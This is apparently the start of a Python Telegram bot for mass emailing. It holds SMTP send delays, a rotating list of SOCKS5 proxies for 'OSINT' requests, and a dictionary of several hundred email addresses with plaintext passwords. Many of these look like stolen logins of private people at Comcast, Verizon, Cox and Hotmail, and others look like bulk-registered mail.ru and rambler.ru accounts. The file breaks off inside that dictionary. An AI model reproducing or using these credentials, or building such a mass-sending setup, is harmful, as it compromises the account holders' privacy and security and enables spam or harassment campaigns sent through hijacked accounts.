#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import logging
import smtplib
import threading
import random
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import socks

# ======================== КОНФИГУРАЦИЯ ========================
BOT_TOKEN = os.getenv("BOT_TOKEN", "")          # токен бота
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))       # твой Telegram ID

# Задержки между письмами (секунды)
DELAY_BETWEEN_EMAILS = 0.5
DELAY_BETWEEN_SENDERS = 2

# ---------------------- ПРОКСИ (SOCKS5) для OSINT-запросов ----------------------
SOCKS5_PROXIES = [
    "5.255.99.75:1080",
    "203.189.154.80:1080",
    "5.255.113.177:1080",
    "152.70.57.143:1080",
    "212.58.132.5:1080",
    "5.255.103.55:1080",
    "152.53.144.223:1080",
    "185.125.171.171:1080",
    "185.125.201.149:7443",
    "134.122.64.174:1080",
    "23.175.248.21:1080",
    "213.165.38.234:1080",
    "37.220.83.249:1080",
    "2.27.53.6:1080",
    "176.114.86.151:1080",
    "43.162.99.202:1080",
    "47.237.116.215:1080",
    "213.230.121.41:1080",
    "180.178.56.106:1080",
    "5.255.123.162:1080",
    "88.198.128.131:1080",
    "103.197.48.208:1080",
    "46.62.214.3:1080",
    "171.25.158.95:1080",
    "43.161.217.219:1080",
    "5.16.21.117:1080",
    "45.80.231.251:1080",
    "109.200.111.164:1080",
    "193.233.130.75:1080",
    "202.62.55.95:1080",
    "5.255.117.250:1080",
    "85.143.254.38:1080"
]

def get_proxy():
    """Возвращает случайный прокси в формате для requests"""
    if not SOCKS5_PROXIES:
        return None
    proxy_str = random.choice(SOCKS5_PROXIES)
    host, port = proxy_str.split(":")
    return {
        "http": f"socks5://{host}:{port}",
        "https": f"socks5://{host}:{port}"
    }

def make_request_with_fallback(url, method="GET", **kwargs):
    """Выполняет HTTP-запрос: сначала через прокси, при ошибке – без прокси"""
    proxy = get_proxy()
    if proxy:
        try:
            kwargs["proxies"] = proxy
            if method.upper() == "GET":
                resp = requests.get(url, timeout=10, **kwargs)
            else:
                resp = requests.post(url, timeout=10, **kwargs)
            if resp.status_code == 200:
                return resp
        except Exception as e:
            logging.warning(f"Прокси {proxy} не сработал: {e}")
    try:
        kwargs.pop("proxies", None)
        if method.upper() == "GET":
            resp = requests.get(url, timeout=10, **kwargs)
        else:
            resp = requests.post(url, timeout=10, **kwargs)
        return resp if resp.status_code == 200 else None
    except Exception as e:
        logging.error(f"Ошибка запроса без прокси: {e}")
        return None

# ---------------------- ОБЪЕДИНЁННЫЙ СПИСОК ОТПРАВИТЕЛЕЙ (более 600) ----------------------
senders = {
    'qstkennethadams388@gmail.com':'itpz jkrh mtwp escx',
    'usppaullewis171@gmail.com':'lpiy xqwi apmc xzmv',
    'ftkgeorgeanderson367@gmail.com':'okut ecjk hstl nucy',
    'nieedwardbrown533@gmail.com':'wvig utku ovjk appd',
    'h56400139@gmail.com':'byrl egno xguy ksvf',
    'den.kotelnikov220@gmail.com':'xprw tftm lldy ranp',
    'trevorzxasuniga214@gmail.com':'egnr eucw jvxg jatq',
    'dellapreston50@gmail.com':'qoit huon rzsd eewo',
    'neilfdhioley765@gmail.com':'rgco uwiy qrdc gvqh',
    'hhzcharlesbaker201@gmail.com':'mcxq vzgm quxy smhh',
    'samuelmnjassey32@gmail.com':'lgct cjiw nufr zxjg',
    'allisonikse1922@gmail.com':'tozo xrzu qndn mwuq',
    'corysnja1996@gmail.com':'pfjk ocbf augx cgiy',
    'maddietrdk1999@gmail.com':'rhqb ssiz csar cvot',
    'yaitskaya.alya@mail.ru':'CeiYHA6GNpvuCz584eCp',
    'yelena.polikarpova.1987@mail.ru':'70Ktuvrs1iYbvSnbK8hG',
    'yeva.zuyeva.85@mail.ru':'EBjgRqq73hue9dGhUA2R',
    'zina.yagovenko.69@mail.ru':'QKBmpXnzFZVu9w4ewSrA',
    'ilya.yaroslavov.72@mail.ru':'A2gNkb8n54i4T7XdPdH5',
    'maryamna.moskvina.62@mail.ru':'dT7ftdX72cMsVemqRRqu',
    'zina.zhvikova@mail.ru':'7CwRkjeL3a5viE9we3bt',
    'boyarinova.fisa@mail.ru':'NnJfmSBzQ9Eew09xirpY',
    'prokhor.sveshnikov.73@mail.ru':'Ybunrxdf95gkzm6A6ipp',
    'azhikelyamov.yulian@mail.ru':'r7hanfr0tMqcBE4Edmg0',
    'prokhor.siyantsev@mail.ru':'yubs6kvtfpWT4Tram26e',
    'yablonev90@mail.ru':'42krThdaYbWCrCbH8UgK',
    'mari.dvornikova.86@mail.ru':'qdEzYLWSTz6UEM2E4i0u',
    'vika.tobolenko.96@mail.ru':'3WQ2wFTwge9m2C09QsfK',
    'koporikov.yura@mail.ru':'nJtyfjqYi91j7tk0udNx',
    'zina.podshivalova.92@mail.ru':'u4CL3YxVutmiuTvmTrbu',
    'leha.novitskiy.71@mail.ru':'qQZd1gMqkU906Xk2hgJJ',
    'polina.karaseva.1987@mail.ru':'mxZUqPPTrZHK99jUfPhB',
    'prokhor.sablin.82@mail.ru':'vN7FjmmCmAD0JnQsANyc',
    'kade.kostya@mail.ru':'U0hdXu7y3c1AVeT1Vpn9',
    'yelizaveta.novokshonova.71@mail.ru':'aKPpgaPDuwaKbX1pbcq3',
    'pozdovp@mail.ru':'EGDd20c7s82Z0s9LmrXc',
    'siyasinovy@mail.ru':'z2ZdsRL04JvBYZrrjrvv',
    'nina.gref.73@mail.ru':'sitw1XTxCVgji061iqj7',
    'fil.golubkin.80@mail.ru':'PeaLrzjbn408DEeiqmQq',
    'venedikt.babinov.71@mail.ru':'tBewA1HQm29c2Zkira96',
    'den.verderevskiy.67@mail.ru':'fndp7qr67dpfXBAu0ePH',
    'olga.viranovskaya.92@mail.ru':'50QSPrecgk5cMdk1YsBm',
    'uyankilovich@mail.ru':'Muw9kX9vAhhKxbZXZ3sh',
    'clqdxtqbfj@rambler.ru':'8278384a3L51C',
    'qeuvkzwxao@rambler.ru':'72325556pMFol',
    'mgiwwgbjqt@rambler.ru':'3180204jCoAdt',
    'olwogjcicw@rambler.ru':'3993480P4Gyth',
    'qjdmjszsnc@rambler.ru':'6545403StkbOh',
    'yqoibpcoki@rambler.ru':'695328653f9Wp',
    'vnlhjjkbxr@rambler.ru':'4609313egqV59',
    'vpgcdkunar@rambler.ru':'9936120R4LYh3',
    'agycsnogqq@rambler.ru':'0234025nWwX5j',
    'ctmhzsngse@rambler.ru':'2480571s1sZvW',
    'ryztzlttdn@rambler.ru':'9416368kTX5jI',
    'hqxybovebw@rambler.ru':'8245145VhX704',
    'rejrjswkwb@rambler.ru':'5114881xCYqsB',
    'xkbecjvxnx@rambler.ru':'5670524FiFi39',
    'xnlqkfvwzx@rambler.ru':'7911186rp8L9P',
    'gvzzmqtuzy@rambler.ru':'5133370ZstXEx',
    'eijxsbjyfy@rambler.ru':'36196124YQZeI',
    'bizdlfuahq@rambler.ru':'8374903tkk2gA',
    'dhehumtsef@rambler.ru':'9126453AkhK0Z',
    'zsotxpaxvi@rambler.ru':'46227528QryxI',
    'ktsgdygeuc@rambler.ru':'1853586bnCyzK',
    'uiacgqvgpe@rambler.ru':'65280104FvoJW',
    'ynazuhytyd@rambler.ru':'1038469bD3PXc',
    'ewmyymarvi@rambler.ru':'5023318Bh3tBg',
    'wllhpdisuj@rambler.ru':'24856958LdTsS',
    'ldqicaqxqo@rambler.ru':'3878601ZNDUtq',
    'qnuumqoreq@rambler.ru':'97575207Is6tx',
    'hlqhvdwpvn@rambler.ru':'6886684bPjiyd',
    'mjjjxiuadq@rambler.ru':'0606032V81m1F',
    'qmasujqfrk@rambler.ru':'277585511anUy',
    'mfemvxqdcq@rambler.ru':'8831015UwqwWD',
    'jauvxszfam@rambler.ru':'0711044gqzrVR',
    'lkmujuagfk@rambler.ru':'08781007DLS8k',
    'kcamwmzxjo@rambler.ru':'9812873rVr1MY',
    'czkklwifon@rambler.ru':'74278883h9FP8',
    'tsjsbqyrfk@rambler.ru':'0150917jIseH2',
    'pbetvcnhzh@rambler.ru':'9952234XaKDFu',
    'bsahxcpwkw@rambler.ru':'2860163ch8Ido',
    'xphyesgbtc@rambler.ru':'6594341ERehhX',
    'egmpjoufeq@rambler.ru':'2613441hfDuWr',
    'jyaolatwam@rambler.ru':'7668835xdjLbg',
    'istooplcmf@rambler.ru':'6592403JR47Wm',
    'vxesoednot@rambler.ru':'35885918QZw94',
    'oywtklayaz@rambler.ru':'4434448KsCuTf',
    'tazxrlpjil@rambler.ru':'8342862p9Wyst',
    'aumiycpxid@rambler.ru':'4109383BuuNcN',
    'lrrztbfuzy@rambler.ru':'3646406sDO8ay',
    'ocggavguxr@rambler.ru':'6406050SL2mZG',
    'imprdsrnmd@rambler.ru':'4869746vpxksJ',
    'eidyoikavp@rambler.ru':'1243890yXPyix',
    'jtbcabsapw@rambler.ru':'566339497yHv3',
    'szokdvnzrw@rambler.ru':'5285567I3Bil1',
    'jqflrccfjs@rambler.ru':'7239478VeLuf1',
    'nhmxjawemh@rambler.ru':'22695409fkCex',
    'uoolwvvwdc@rambler.ru':'1073090zX6ebM',
    'bdnptczren@rambler.ru':'2684430DcPEuk',
    'bfghzdkurg@rambler.ru':'3874335d5hDQy',
    'ljlexsfcvo@rambler.ru':'4102671EIquGo',
    'byzjhysyyg@rambler.ru':'4637736mzdEcT',
    'tlrjbuzcyj@rambler.ru':'2437827AhPaGW',
    'denjsbmggh@rambler.ru':'228014585ayVe',
    'ekkjrcskzo@rambler.ru':'6609442MFPeDO',
    'ptpjocqobw@rambler.ru':'6047270EXk7Hb',
    'nekrxmcklm@rambler.ru':'3532718I3vV4C',
    'ulgqeqvdqy@rambler.ru':'6764301Nx25yL',
    'ezofozvhyn@rambler.ru':'43181265tC6FQ',
    'hwklsnkqky@rambler.ru':'2399374mHyEUJ',
    'elglaqexoj@rambler.ru':'9803014pMNF9p',
    'rgmjfwhhjs@rambler.ru':'3268611cfC3aR',
    'vcvwvkntgb@rambler.ru':'6536007UgTXg4',
    'phkohtlitv@rambler.ru':'0238010TXt5aN',
    'pqqqyejlqi@rambler.ru':'0429804UwSSi2',
    'toxevermnd@rambler.ru':'1801000MqDm87',
    'dicfdqgxad@rambler.ru':'2062460Tbvjlz',
    'sktsnxhcxe@rambler.ru':'35185285Pon91',
    'jpljjnrrla@rambler.ru':'0815671xPHjiw',
    'rtqpiimiid@rambler.ru':'6534672URa1mI',
    'ldygdlpizk@rambler.ru':'6686886YWhL05',
    'fqxqadaxfy@rambler.ru':'3195621x5qYdU',
    'chybzpsglw@rambler.ru':'8032931YTKllg',
    'vkctzanare@rambler.ru':'1157997LGySqk',
    'repjncygun@rambler.ru':'3300691BqYJVG',
    'khrarivdow@rambler.ru':'7168350Cmqkmj',
    'aqbeitoqdl@rambler.ru':'87552792499tS',
    'vhauhgmbnc@rambler.ru':'9276444y9YzY1',
    'cfoqabqkbi@rambler.ru':'4601718gc2Zji',
    'kmqnowhvjp@rambler.ru':'6667003L1jZxc',
    'djsdksvzhj@rambler.ru':'7523251yAKPjZ',
    'uztbbbfqbp@rambler.ru':'8265517naN9fx',
    'ljrbpfuicp@rambler.ru':'39793362TjZIk',
    'jzzdyxicjo@rambler.ru':'8117494s6CZVB',
    'gjnbtrflkc@rambler.ru':'8623171iqXOD9',
    'jfjtwncyeb@rambler.ru':'7066987lMSG2Z',
    'rfphqkyyrj@rambler.ru':'8800207M5Nj7Y',
    'ilynipkqwx@rambler.ru':'83333032WQo83',
    'ifzenleixs@rambler.ru':'69679436xM9U4',
    'oevwtysoel@rambler.ru':'6918228UC47Zs',
    'hpdkdwqvzx@rambler.ru':'0605431xMVexd',
    'ekbkufxdxx@rambler.ru':'1918712uEOQ9t',
    'zstxwfwiof@rambler.ru':'4043772UwRp5o',
    'rjmrbybhnd@rambler.ru':'5203792lDmxvC',
    'eukygnfzno@rambler.ru':'3520959hXs1Zw',
    'ljrolbwlad@rambler.ru':'0394475pK0dYa',
    'gozpezocmj@rambler.ru':'8282635Gkvuvq',
    'asytoiumwt@rambler.ru':'42141199FgP3H',
    'fbiooohghv@rambler.ru':'7338453zMbWhb',
    'ajwlalfqqu@rambler.ru':'3360915x1XVgt',
    'cvegntetwm@rambler.ru':'8091607CSuKMf',
    'jnhjnmicbt@rambler.ru':'6375986dokrgG',
    'fnaauasmjz@rambler.ru':'4160248ztCRsJ',
    'qnwmlvfwct@rambler.ru':'8367630XGXmxW',
    'lkycbhjcwp@rambler.ru':'5255980KedZTc',
    'bkyojwrkxl@rambler.ru':'1286663uHl4WQ',
    'lxddybklck@rambler.ru':'1077242JFSyQN',
    'chzhdkoxnp@rambler.ru':'0533445SI0q7c',
    'ofjxkwwomf@rambler.ru':'04956317DKrSX',
    'jlirgtapbl@rambler.ru':'8728917NdMxgN',
    'dgcceghlse@rambler.ru':'2986381aT5V36',
    'rkwfhcvlem@rambler.ru':'10022063K5qmY',
    'orgjvhbrxw@rambler.ru':'0652659TopL8Z',
    'opynskpmzp@rambler.ru':'2881423L4qs6x',
    'pbqzrueeko@rambler.ru':'44469262tOGeK',
    'raxzhngqti@rambler.ru':'3078265mgWYjl',
    'ztnxozwuuj@rambler.ru':'0637919utKekj',
    'gtxjzwlgio@rambler.ru':'3737088WWddrY',
    'sjbflcwjgn@rambler.ru':'9791667kVGllD',
    'znggdpfxzu@rambler.ru':'0209083jdisUI',
    'gnvhlocnro@rambler.ru':'4361239Vu3OCl',
    'vqeijhgrmo@rambler.ru':'5560137M1oKk2',
    'meefvzfwqb@rambler.ru':'9793015vJE0qF',
    'sclsjzvugn@rambler.ru':'4631432OQjvWt',
    'ybbtiosefy@rambler.ru':'3511505pL04S1',
    'agwqdadpkb@rambler.ru':'0930298CUZdLp',
    'kudgvibwao@rambler.ru':'5791834nlLQtU',
    'qyonxjqbxi@rambler.ru':'9390829m2Edz3',
    'jhetdlhlqk@rambler.ru':'5530162MiLHZe',
    'bsjvczarsc@rambler.ru':'5747155KvNjcL',
    'wlcilpvzqu@rambler.ru':'2757580jLlM9M',
    'xxdgcixidw@rambler.ru':'2867562O7zGft',
    'wekduwrnkp@rambler.ru':'2646367TlIskI',
    'keakcnrorg@rambler.ru':'9223165cV1Jj8',
    'nzuspyevwr@rambler.ru':'2212416npkUqe',
    'mgjfbgitts@rambler.ru':'7368986roeLXD',
    'smfxvrnhmu@rambler.ru':'6947298Kau5qA',
    'yvkelubdzf@rambler.ru':'5913332lXWtlC',
    'bwywtjxybd@rambler.ru':'2766021wTSkeU',
    'dlvyzavolw@rambler.ru':'274983252lHyu',
    'oaudcugulf@rambler.ru':'4543030UHFWaV',
    'zvqexaokhf@rambler.ru':'1453114PCheCq',
    'pjuafpzpoo@rambler.ru':'8474216vNFUG0',
    'ckryhpqogh@rambler.ru':'4791674aJHW43',
    'vlkqstbhpd@rambler.ru':'3021260kBI3KU',
    'jwuupemjpm@rambler.ru':'7769235y719L9',
    'bmxuqrzcnk@rambler.ru':'1345552ExHXyu',
    'fqrkonqkjc@rambler.ru':'4104158bVEORa',
    'gizwbhyrfd@rambler.ru':'3863359lgfpTv',
    'onghqwbvnz@rambler.ru':'8249537XWqpPk',
    'aeyeyvlnkl@rambler.ru':'6025219f5mGom',
    'qcwweqcqbx@rambler.ru':'2503306kHzKPD',
    'vefmynztzu@rambler.ru':'1134939bhRpJS',
    'qlkhitdctp@rambler.ru':'31621358ZPx5F',
    'xhgfgecvrn@rambler.ru':'4116759TRhERi',
    'globizrzui@rambler.ru':'9679753mLkmMd',
    'vvfcuoibrf@rambler.ru':'13558992CDkJj',
    'enccmwktap@rambler.ru':'7631476Lzr9hd',
    'njbnyghvdq@rambler.ru':'48585907Qh2NS',
    'cobadewaxd@rambler.ru':'6433228NMX7a0',
    'zzvsuoiqfx@rambler.ru':'5067380KtnMTb',
    'lkdcjpcqxu@rambler.ru':'8319085aRHdoT',
    'zcabeofgox@rambler.ru':'0059181TJSaJq',
    'rswrifhmtf@rambler.ru':'2987108xzf1Uy',
    'gebzgyscic@rambler.ru':'6981082UOD1sL',
    'yhncgfwjom@rambler.ru':'7866073mRMAal',
    'pvvlmjmiwe@rambler.ru':'2807349CLUZie',
    'towqdsigmc@rambler.ru':'48481486UnoRg',
    'eyzwvxphxz@rambler.ru':'5532563Bskght',
    'aruhbkpsud@rambler.ru':'8022722dNUe59',
    'kckwnnvmwf@rambler.ru':'77502899D6ygI',
    'emicquwuxf@rambler.ru':'2982514obBgCJ',
    'pnefqbonja@rambler.ru':'1443294ZY7BgB',
    'wlnecrzvkb@rambler.ru':'2016456ke4QRw',
    'lucufydobd@rambler.ru':'4188202gvlmuR',
    'obcheovoqy@rambler.ru':'34012721sYlv3',
    'fjxwhhlhxp@rambler.ru':'1621680a9CbS0',
    'rjggfmhckx@rambler.ru':'4470958ocoPjD',
    'oqixhlbhlh@rambler.ru':'4902150aD8Tkr',
    'zmlfdygkce@rambler.ru':'4809956HgOdyu',
    'zdjqfhdafp@rambler.ru':'9142498RW8Ynh',
    'cjoyoxsdby@rambler.ru':'108516737An82',
    'hfrcbbwzgb@rambler.ru':'1732107RUVvSu',
    'crkbywjfzg@rambler.ru':'9616254qbUhAG',
    'luygpfibra@rambler.ru':'9488606qXIvQZ',
    'xepjtcrrzo@rambler.ru':'3774977dMOr4c',
    'ayrbethwst@rambler.ru':'4658060glYVyA',
    'czhjnqqgdd@rambler.ru':'89865789wXqfK',
    'oltotetppj@rambler.ru':'0936665mJL9H0',
    'eaoeqvygrv@rambler.ru':'5348316HcEpsm',
    'dkfvwvkotb@rambler.ru':'3366454MTGiOR',
    'wavsfqiarg@rambler.ru':'4220587wVJ8gU',
    'gkwlbrhwix@rambler.ru':'6383580cCHutT',
    'uachryyzde@rambler.ru':'0643369cWRWhr',
    'nuyfldwirg@rambler.ru':'29709163eKxWc',
    'fnorovxtvk@rambler.ru':'469173140zLer',
    'qrmnfyxdqj@rambler.ru':'7609701E9XfBC',
    'ncupywgysj@rambler.ru':'8506439mTgrb6',
    'ehhuextqqm@rambler.ru':'4136418EqGa4N',
    'utasiosnxd@rambler.ru':'6230428wOiMLm',
    'ppizzpzqod@rambler.ru':'6217530deEIGb',
    'mgzczmjjpo@rambler.ru':'5974114gf7VLz',
    'ezugyxxfkx@rambler.ru':'6920685aZVulS',
    'vnuwwwuhuj@rambler.ru':'20889562nRk1x',
    'xqkicchcbc@rambler.ru':'4345126XoitUD',
    'hykbjrvqsw@rambler.ru':'8281493mLUbNt',
    'etyqikxlam@rambler.ru':'1096360Cvg5n7',
    'blnpfilkdh@rambler.ru':'6208964Fhgy1O',
    'azawxjcfeh@rambler.ru':'8923382Pqo1jI',
    'dyumumpgus@rambler.ru':'3454195S5FQ7d',
    'ryejfejmef@rambler.ru':'1474062Y49oZE',
    'uqyfeqyumv@rambler.ru':'4305431o270vK',
    'vardlzqzas@rambler.ru':'8158325VAjymq',
    'wvqbwbpofd@rambler.ru':'2037592lvIWZI',
    'agsnpvxscg@rambler.ru':'676450330Gmzj',
    'ctiwtwpowk@rambler.ru':'7004605qQOK5O',
    'vvluscokds@rambler.ru':'2351339uVtaUb',
    'gqtipysiyk@rambler.ru':'4672575GMSkQq',
    'vwtjzupcul@rambler.ru':'6978060SRfKxQ',
    'klvdgsoczb@rambler.ru':'8504791kNehzf',
    'lavpussyin@rambler.ru':'1183746FmKlfU',
    'xvzoptqyhd@rambler.ru':'7635851M7gCQO',
    'yzkgydxjlr@rambler.ru':'3889248nBv9xb',
    'tkuscgummb@rambler.ru':'2646861vfBmjy',
    'ytbfnnlvuc@rambler.ru':'8680715wXqNoY',
    'qrmyueqrpk@rambler.ru':'48163158cQzn3',
    'nulburzrsp@rambler.ru':'4628721fbFYDx',
    'xpsncakaar@rambler.ru':'8050121QgZtLE',
    'rsfyuinlhi@rambler.ru':'7789677doEl7X',
    'lruwhkjpmm@rambler.ru':'2407934PCrhbt',
    'zqlboekoph@rambler.ru':'4540547BXedBD',
    'djrmgdvpxk@rambler.ru':'2516345lt4GhI',
    'cdyagajvqt@rambler.ru':'0457036J8b9x1',
    'csbmtfyogo@rambler.ru':'8578398RoY5Me',
    'mtgjgvchbf@rambler.ru':'6273263XOh0fb',
    'hjovrkraea@rambler.ru':'1756354e4T9PL',
    'wuasdmqayg@rambler.ru':'8983467Njjbfc',
    'dnzaquycrh@rambler.ru':'3047369gLtNHO',
    'rdptnhimnz@rambler.ru':'92217639LcTX1',
    'yklofyaekj@rambler.ru':'0018913JhfLfv',
    'zqfzplzlwp@rambler.ru':'6550676M1gwNy',
    'fzcveyejbh@rambler.ru':'9098104PB57ol',
    'qcpwhpqape@rambler.ru':'3277585gafS4o',
    'xfitvnzvez@rambler.ru':'0023433CgWWiW',
    'tiansbolvj@rambler.ru':'0200419d6c8hD',
    'ibwukvjyxn@rambler.ru':'6846348Go4rB7',
    'tfclkifgjn@rambler.ru':'9973469KBqk2S',
    'yscehsgepj@rambler.ru':'0258935Wptd0G',
    'webznumpmf@rambler.ru':'4342482ZhTyVk',
    'xadehtuxys@rambler.ru':'94129234ZK2kl',
    'wsfmuqnmjp@rambler.ru':'7886187uCcru0',
    'mhovkuzfnl@rambler.ru':'3632660bLpvSw',
    'pppuvtsuxu@rambler.ru':'6227635FqgnGa',
    'vvezjeryic@rambler.ru':'7595367ZgjYIn',
    'oiukjktkhx@rambler.ru':'35863397YZBFb',
    'qswbndmblj@rambler.ru':'3563325a93EZ6',
    'ztyfnsdrqa@rambler.ru':'7748929ZbfDrw',
    'lrjduagkcj@rambler.ru':'8783147DV4pJe',
    'fhrzanukuh@rambler.ru':'169703230lEf6',
    'pqnnzwuuku@rambler.ru':'6446752B0qw8H',
    'ndctkqjnfc@rambler.ru':'1534939xHfafC',
    'tlzuekovcn@rambler.ru':'9668644RKjMla',
    'ermdcrjyhu@rambler.ru':'9838788xXiLRC',
    'qbfymlhpwj@rambler.ru':'3278597BlWafL',
    'uuuzmgapoy@rambler.ru':'2535811Vz3dxV',
    'chjolhsihy@rambler.ru':'8253848P8B5cd',
    'rrakdmtsdb@rambler.ru':'0459246V4tjHK',
    'ngkrbvqvha@rambler.ru':'9835759JQxkal',
    'caxeoztjpa@rambler.ru':'1297098SSweKM',
    'molnxkchzu@rambler.ru':'3122920NIh3iE',
    'murnslgulf@rambler.ru':'1045964Oppb9c',
    'qcjyautxca@rambler.ru':'6358075LUbp6R',
    'amhlnrxaue@rambler.ru':'3401580IiYPYn',
    'wexnexkcct@rambler.ru':'2157766eLIiqP',
    'oplwkvkrct@rambler.ru':'7136350vkGkaT',
    'pmddwbvmwv@rambler.ru':'3066705M2aCUh',
    'aqjcdxeuuh@rambler.ru':'2077271RlOJ0c',
    'baiivnfrdy@rambler.ru':'1327519LJwKyi',
    'apvskvwhsv@rambler.ru':'2995739T8pCNZ',
    'xsejblkgit@rambler.ru':'6224118EhnkyG',
    'rxihtsvdxg@rambler.ru':'3045787jhQxfI',
    'dgtmxgrdsm@rambler.ru':'0342058YAff0O',
    'wuxaurjkuu@rambler.ru':'6231160X8CsYl',
    'erimfuxfdl@rambler.ru':'1956070yzlgSl',
    'ncklilvfts@rambler.ru':'5077711XhCUzu',
    'eerlpvniie@rambler.ru':'6769422kteVgK',
    'mcrtyjkbdi@rambler.ru':'5281059WC9HfI',
    'izjnzlavcu@rambler.ru':'4201974Gjdy1B',
    'tkrywugfgq@rambler.ru':'1037112WpAZzl',
    'hpxzczhgwe@rambler.ru':'4522788wYVDJk',
    'rtfanictwt@rambler.ru':'9292445IxACdk',
    'lhschktxka@rambler.ru':'0731083E0ItX4',
    'zfqfwvmnms@rambler.ru':'82390631NIbOF',
    'rzaviakxlb@rambler.ru':'2230383uFiVmA',
    'rmmueooozx@rambler.ru':'1531525wyFFSm',
    'weasmvistt@rambler.ru':'7079364RGZCBs',
    'qikszesoqz@rambler.ru':'6739326h2Wy4j',
    'gosgrmonmh@rambler.ru':'7425012zw2LXl',
    'vuhlehwstc@rambler.ru':'6477750sVXsV3',
    'wcbmulbsbk@rambler.ru':'9889803qVwaj6',
    'aejerwwnft@rambler.ru':'4598847uygrUg',
    'rtrkjygdey@rambler.ru':'4810312JrG4Ti',
    'uywyrkhuue@rambler.ru':'6593801fMGH6b',
    'flqyimskwk@rambler.ru':'7856809GVZfzT',
    'mqjqttpyui@rambler.ru':'3633261lxxEPt',
    'asagkqfygx@rambler.ru':'90629300zd5Xm',
    'bupfcjoqrc@rambler.ru':'7806644uXzkZy',
    'twicbfjgoz@rambler.ru':'0187832xjeOz1',
    'Fodortigh@outlook.com': 'ruble1221',
    'evg-struzhenkov@yandex.ru': 'zmARvx1MRvXppZV6xkXj',
    'prekrasno.el@yandex.ru': 'RakuzanSnos',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
    'aria.therese.svensson@mail.com': 'Zorro1ab',
    'taterbug@verizon.net': 'Holly1!',
    'ejbrickner@comcast.net': 'Pass1178',
    'teressapeart@cox.net': 'Quinton2329!',
    'liznees@verizon.net': 'Dancer008',
    'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
    'kcdg@charter.net': 'Jennifer3*',
    'bean_118@hotmail.com': 'Liverpool118!',
    'dsdhjas@mail.com': 'LONGHACH123',
    'robitwins@comcast.net': 'May241996',
    'wasina@live.com': 'Marlas21',
    'aruzhan.01@mail.com': '1234567!',
    'rob.tackett@live.com': 'metallic',
    'lindahallenbeck@verizon.net': 'Anakin@2014',
    'hlaw82@mail.com': 'Snoopy37$$',
    'paintmadman@comcast.net': 'mycat2200*',
    'prideandjoy@verizon.net': 'Ihatejen12',
    'sdgdfg56@mail.com': 'kenwood4201',
    'garrett.danelz@comcast.net': 'N11golfer!',
    'gillian_1211@hotmail.com': 'Gilloveu1211',
    'sunpit16@hotmail.com': 'Putter34!',
    'fdshelor@verizon.net': 'Masco123*',
    'yeags1@cox.net': 'Zoomom1965!',
    'amine002@usa.com': 'iScrRoXAei123',
    'bbarcelo16@cox.net': 'Bsb161089$$',
    'laliebert@hotmail.com': 'pirates2',
    'vallen285@comcast.net': 'Delft285!1!',
    'sierra12@email.com': 'tegen1111',
    'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
    'kmay@windstream.net': 'Nascar98',
    'redbrick1@mail.com': 'Redbrick11',
    'ivv9ah7f@mail.com': 'K226nw8duwg',
    'erkobir@live.com': 'floydLAWTON019',
    'Misscarter@mail.com': 'ashtray19',
    'carlieruby10@cox.net': 'Lollypop789$',
    'blackops2013@mail.com': 'amason123566',
    'caroline_cullum@comcast.net': 'carter14',
    'dpb13@live.com': 'Ic&ynum13',
    'heirhunter@usa.com': 'Noguys@714',
    'sherri.edwards@verizon.net': 'Dreaming123#',
    'rami.rami1980@hotmail.com': 'ramirami1980',
    'jmsingleton2@comcast.net': '151728Jn$$',
    'aberancho@aol.com': '10diegguuss10',
    'dgidel@iowatelecom.net': 'Buster48',
    'gpopandopul@mail.com': 'GEORG62A',
    'bolgodonsk@mail.com': '012345678!',
    'colbycolb@cox.net': 'Signals@1',
    'nicrey4@comcast.net': 'Dabears54',
    'mordechai@mail.com': 'Mordechai',
    'inemrzoya@mail.com': 'rLS1elaUrLS1elaU',
    'tarabedford@comcast.net': 'Money4me',
    'mycockneedsit@mail.com': 'benjamin3',
    'saralaine@mail.com': 'sarlaine12!1',
    'jonb2006@verizon.net': '1969Camaro',
    'rjhssa1@verizon.net': 'Donna613*',
    'cameron.doug@charter.net': 'Jake2122$',
    'bridget.shappell@comcast.net': 'Brennan1',
    'rugs8@comcast.net': 'baseball46',
    'averyjacobs3@mail.com': '1960682644!',
    'lstefanick@hotmail.com': 'Luv2dance2',
    'bchavez123@mail.com': 'aadrianachavez',
    'lukejamesjones@mail.com': 'tinkerbell1',
    'emahoney123@comcast.net': 'Shieknmme3#',
    'mandy10.mcevoy@btinternet.com': 'Tr1plets3',
    'jet747@cox.net': 'Sadie@1234',
    'landsgascareservices@mail.com': 'Alisha25@',
    'samantha224@mail.com': 'Madden098!@',
    'kbhamil@wowway.com': 'Carol1940',
    'email@bjasper.com': 'Lhsnh4us123!',
    'biggsbrian@cox.net': 'Trains@2247Trains@2247',
    'dzzeblnd@aol.com': 'Geosgal@1',
    'jtrego@indy.rr.com': 'Jackwill14!',
    'chrisphonte.rj@comcast.net': 'Junior@3311',
    'tvwifiguy@comcast.net': 'Bill#0101',
    'defenestrador@mail.com': 'm0rb1d8ss',
    'glangley@gmx.com': 'ironhide',
    'charlotte2850@hotmail.com': 'kelalu2850',
    'raumonatuhadi@mail.ru': 'a7r6U9J6KHDaguAsidDH',
    'floworadpewoodvi@mail.ru': 'ZcyUg5MUq8jMr9i8aST1',
    'letzegebquirdisnui@mail.ru': 'abniAcbrCjRskpysMc75',
    'millveramontmoni@mail.ru': 'bLd8Zg4tqfxmUq7KW5jW',
    'letkixipromnussi@mail.ru': 'bNraxddiagE9Sx23SxYt',
    'hotriosmartraverba@mail.ru': 'cALqh0bjnPefyiu7WL0v',
    'pillgemisscritcomsa@mail.ru': 'dHBUrMg6aqXhvx0m1cVf',
    'leigedeamvebig@mail.ru': 'dVTsGqDbZYbjse9iHNR2',
    'knocrufridunringgent@mail.ru': 'dn333DbbuEfGnqw08Rxm',
    'tworensodiapansaa@mail.ru': 'dsGajJE1TtiAGgZsgyvQ',
    'korlithiobtennick@mail.ru': 'feDLSiueGT89APb81v74',
    'leonid.morozov.0303@mail.ru': 'sJfiTjnxZCsfn8T9ce0t',
    'kseniya.pavlova.9898@mail.ru': 'GRVDAjqvvx9xz00L2wUx',
    'petrovoleg.882@mail.ru': '0nzg033y21qKqWwTHUza',
